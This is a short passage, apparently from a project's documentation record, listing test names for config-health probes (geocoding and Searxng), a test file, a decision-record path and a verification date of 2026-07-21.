  (`GeocodingProbe_ClassifiesBody`, `SearxngProbe_ClassifiesStatus`, `GeocodingProbe_NullWhenKeyAbsent`),
  `tests/Agent42.Tests/ConfigHealthApiTests.cs` (`Static_RunsNoProbes`),
  `.agentic/decisions/0029-config-health-tab.md`
- **Verified:** 2026-07-21
